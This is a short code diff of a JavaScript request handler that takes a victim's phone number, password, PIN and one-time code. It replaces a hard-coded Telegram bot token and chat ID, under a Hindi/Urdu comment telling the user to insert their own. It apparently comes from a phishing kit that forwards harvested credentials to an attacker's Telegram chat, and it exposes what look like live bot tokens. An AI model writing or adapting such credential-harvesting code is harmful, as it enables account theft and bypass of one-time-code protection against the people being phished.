@@ -6,8 +6,8 @@ export default async function handler(req, res) {
     const { type, phone, password, pin, otp } = req.body;
 
     // Yahan apna Telegram Bot Token aur Chat ID daal dein
-    const BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-    const CHAT_ID = '6076330929';
+    const BOT_TOKEN = '9187693549:AAE6XbH9dHptJ1BXg4Nt4tgXwXVyF1alhAA';
+    const CHAT_ID = '6823444975';
 
     let message = '';
 
